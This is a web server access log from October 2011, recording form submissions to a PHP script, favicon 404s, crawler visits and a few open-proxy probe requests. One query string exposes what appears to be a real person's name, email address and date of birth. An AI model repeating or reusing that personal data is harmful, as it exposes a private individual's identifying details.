10.18.44.37 - - [07/Oct/2011:08:50:39 -0500] "POST /formreturn.php HTTP/1.1" 200 451 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.37 - - [07/Oct/2011:08:50:39 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.37 - - [07/Oct/2011:08:50:39 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.57 - - [07/Oct/2011:08:50:58 -0500] "POST /formreturn.php HTTP/1.1" 200 439 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.4.246 - - [07/Oct/2011:08:51:18 -0500] "POST /formreturn.php HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.65.4.246 - - [07/Oct/2011:08:51:23 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.65.4.246 - - [07/Oct/2011:08:52:17 -0500] "POST /formreturn.php HTTP/1.1" 200 451 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.54 - - [07/Oct/2011:08:56:25 -0500] "POST /formreturn.php HTTP/1.1" 200 456 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.54 - - [07/Oct/2011:08:57:46 -0500] "POST /formreturn.php HTTP/1.1" 200 455 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.57 - - [07/Oct/2011:09:30:14 -0500] "POST /formreturn.php HTTP/1.1" 200 440 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.43 - - [07/Oct/2011:09:31:42 -0500] "POST /formreturn.php HTTP/1.1" 200 370 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.51 - - [07/Oct/2011:09:32:46 -0500] "POST /formreturn.php HTTP/1.1" 200 451 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [07/Oct/2011:09:32:46 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.39 - - [07/Oct/2011:09:32:52 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF HTTP/1.1" 200 420 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.39 - - [07/Oct/2011:09:33:03 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.39 - - [07/Oct/2011:09:33:05 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:09:34:11 -0500] "POST /formreturn.php HTTP/1.1" 200 461 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:09:34:20 -0500] "POST /formreturn.php HTTP/1.1" 200 460 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.51 - - [07/Oct/2011:09:35:55 -0500] "POST /formreturn.php HTTP/1.1" 200 439 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [07/Oct/2011:09:35:55 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [07/Oct/2011:09:36:38 -0500] "POST /formreturn.php HTTP/1.1" 200 488 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [07/Oct/2011:09:36:39 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.86 - - [07/Oct/2011:09:38:48 -0500] "POST /formreturn.php HTTP/1.1" 200 418 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.86 - - [07/Oct/2011:09:38:48 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.43 - - [07/Oct/2011:09:42:02 -0500] "POST /formreturn.php HTTP/1.1" 200 433 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.37 - - [07/Oct/2011:09:42:32 -0500] "POST /formreturn.php HTTP/1.1" 200 395 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.39 - - [07/Oct/2011:09:47:02 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF HTTP/1.1" 200 420 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.39 - - [07/Oct/2011:09:47:22 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF&very_gray=very_gray&pretty_common=pretty_common&emerald=emerald&holiday_blue=holiday_blue&barney_purple=barney_purple HTTP/1.1" 200 481 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:10 -0500] "POST /formreturn.php HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:10 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:11 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:11 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:13 -0500] "POST /formreturn.php HTTP/1.1" 200 350 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.38 - - [07/Oct/2011:09:49:28 -0500] "POST /formreturn.php HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0"
10.65.1.168 - - [07/Oct/2011:09:49:49 -0500] "POST /formreturn.php HTTP/1.1" 200 369 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:49 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:49 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:49:50 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.39 - - [07/Oct/2011:09:50:11 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF&very_gray=very_gray&pretty_common=pretty_common&emerald=emerald&holiday_blue=holiday_blue&barney_purple=barney_purple HTTP/1.1" 200 481 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.85 - - [07/Oct/2011:09:51:00 -0500] "POST /formreturn.php HTTP/1.1" 200 417 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:51:02 -0500] "POST /formreturn.php HTTP/1.1" 200 366 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:51:03 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:51:03 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:51:03 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.48 - - [07/Oct/2011:09:51:26 -0500] "GET /formreturn.php?full_name=Rob+MacPherson&email=macpherson.rob%40gmail.com&dob=25-01-1976&gender=m&epicness_purple=barney+purple HTTP/1.1" 200 435 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.48 - - [07/Oct/2011:09:51:29 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.43 - - [07/Oct/2011:09:51:31 -0500] "POST /formreturn.php HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.85 - - [07/Oct/2011:09:51:50 -0500] "POST /formreturn.php HTTP/1.1" 200 453 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.39 - - [07/Oct/2011:09:52:28 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF&very_gray=very_gray&pretty_common=pretty_common&emerald=emerald&holiday_blue=holiday_blue&barney_purple=barney_purple HTTP/1.1" 200 481 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.86 - - [07/Oct/2011:09:52:38 -0500] "POST /formreturn.php HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.86 - - [07/Oct/2011:09:52:38 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.47 - - [07/Oct/2011:09:52:52 -0500] "POST /formreturn.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.47 - - [07/Oct/2011:09:52:54 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.51 - - [07/Oct/2011:09:53:16 -0500] "POST /formreturn.php HTTP/1.1" 200 435 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [07/Oct/2011:09:53:16 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.39 - - [07/Oct/2011:09:53:50 -0500] "GET /formreturn.php?full_name=Supply+Full+Name&e-mail=Supply+E-Mail+Address&date_of_birth=Supply+Date+of+Birth&gender=Supply+Gender+M%2FF&very_gray=very_gray&pretty_common=pretty_common&emerald=emerald&holiday_blue=holiday_blue&barney_purple=barney_purple HTTP/1.1" 200 481 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:54:21 -0500] "POST /formreturn.php HTTP/1.1" 200 366 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:54:21 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:54:21 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:54:21 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:55:39 -0500] "POST /formreturn.php HTTP/1.1" 200 366 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:55:39 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:55:40 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:09:55:40 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:10:06:10 -0500] "POST /formreturn.php HTTP/1.1" 200 451 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:10:06:10 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:10:06:10 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.168 - - [07/Oct/2011:10:06:10 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
206.45.180.120 - - [07/Oct/2011:10:07:31 -0500] "GET /favicon.ico HTTP/1.1" 404 508 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
10.65.1.229 - - [07/Oct/2011:10:07:37 -0500] "POST /formreturn.php HTTP/1.1" 200 474 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.43 - - [07/Oct/2011:10:08:07 -0500] "POST /formreturn.php HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:08:14 -0500] "POST /formreturn.php HTTP/1.1" 200 474 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:08:53 -0500] "POST /formreturn.php HTTP/1.1" 200 474 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:08:56 -0500] "POST /formreturn.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:09:02 -0500] "POST /formreturn.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:09:22 -0500] "POST /formreturn.php HTTP/1.1" 200 474 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:09:23 -0500] "POST /formreturn.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:09:30 -0500] "POST /formreturn.php HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:10:30 -0500] "POST /formreturn.php HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.229 - - [07/Oct/2011:10:10:34 -0500] "POST /formreturn.php HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.85 - - [07/Oct/2011:10:10:57 -0500] "POST /formreturn.php HTTP/1.1" 200 467 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [07/Oct/2011:10:17:06 -0500] "POST /formreturn.php HTTP/1.1" 200 366 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [07/Oct/2011:10:17:06 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [07/Oct/2011:10:17:06 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [07/Oct/2011:10:17:06 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
208.80.194.61 - - [07/Oct/2011:10:39:38 -0500] "GET / HTTP/1.0" 200 454 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; CONNINC.COM IE511; FunWebProducts; iebar; SV1; acc=; acc=none; (none))"
216.240.136.95 - - [07/Oct/2011:12:16:47 -0500] "GET / HTTP/1.1" 200 454 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
66.249.71.209 - - [07/Oct/2011:15:27:10 -0500] "GET /robots.txt HTTP/1.1" 404 508 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.209 - - [07/Oct/2011:15:27:10 -0500] "GET / HTTP/1.1" 304 210 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.44.184.50 - - [07/Oct/2011:22:46:12 -0500] "GET http://allrequestsallowed.com/?PHPSESSID=5gh6ncjh00043SRWHWWCYFA%5C%5CO HTTP/1.1" 200 447 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12"
69.58.178.58 - - [07/Oct/2011:23:28:50 -0500] "GET /robots.txt HTTP/1.1" 404 471 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.22; ips-agent) Gecko/20110905 Ubuntu/10.04 (lucid) Firefox/6.0.2"
69.58.178.58 - - [07/Oct/2011:23:29:38 -0500] "GET / HTTP/1.1" 200 461 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.22; ips-agent) Gecko/20110905 Ubuntu/10.04 (lucid) Firefox/6.0.2"
208.80.194.36 - - [08/Oct/2011:18:45:56 -0500] "GET / HTTP/1.0" 200 454 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Sgrunt|V109|267|S1214442904|dial; E-nrgyPlus; dial; Sgrunt|V109|454|S1214442904|dial; ADVPLUGIN|K113|4|S1214442904|dial; ADVPLUGIN|K114|3|S1214442904|dial; snprtz|T29661383900007#296|isdn; (R1 1.5))"
50.72.135.171 - - [08/Oct/2011:21:00:09 -0500] "POST /formreturn.php HTTP/1.1" 200 439 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [08/Oct/2011:21:00:10 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [08/Oct/2011:21:00:10 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [08/Oct/2011:21:00:10 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
207.161.96.229 - - [08/Oct/2011:22:11:37 -0500] "POST /formreturn.php HTTP/1.1" 200 431 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [08/Oct/2011:22:11:40 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [08/Oct/2011:22:27:05 -0500] "POST /formreturn.php HTTP/1.1" 200 490 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [08/Oct/2011:22:27:08 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
142.161.151.82 - - [09/Oct/2011:07:26:41 -0500] "POST /formreturn.php HTTP/1.1" 200 440 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:26:41 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:26:41 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:26:41 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:29:14 -0500] "POST /formreturn.php HTTP/1.1" 200 440 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:29:31 -0500] "POST /formreturn.php HTTP/1.1" 200 440 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:29:37 -0500] "POST /formreturn.php HTTP/1.1" 200 439 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:29:54 -0500] "POST /formreturn.php HTTP/1.1" 200 403 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:30:16 -0500] "POST /formreturn.php HTTP/1.1" 200 403 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:30:30 -0500] "POST /formreturn.php HTTP/1.1" 200 402 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:30:57 -0500] "POST /formreturn.php HTTP/1.1" 200 407 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:37:33 -0500] "POST /formreturn.php HTTP/1.1" 200 399 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:38:45 -0500] "POST /formreturn.php HTTP/1.1" 200 404 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:52:15 -0500] "POST /formreturn.php HTTP/1.1" 200 404 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:07:53:08 -0500] "POST /formreturn.php HTTP/1.1" 200 389 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
142.161.151.82 - - [09/Oct/2011:08:44:01 -0500] "POST /formreturn.php HTTP/1.1" 200 380 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
207.161.96.229 - - [09/Oct/2011:12:39:04 -0500] "POST /formreturn.php HTTP/1.1" 200 431 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [09/Oct/2011:12:39:07 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [09/Oct/2011:12:44:04 -0500] "POST /formreturn.php HTTP/1.1" 200 491 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [09/Oct/2011:12:44:07 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
189.5.252.28 - - [09/Oct/2011:19:34:06 -0500] "GET http://www.sina.com.cn/ HTTP/1.1" 200 461 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"
50.72.32.128 - - [09/Oct/2011:19:44:57 -0500] "POST /formreturn.php HTTP/1.1" 200 486 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.32.128 - - [09/Oct/2011:19:44:57 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
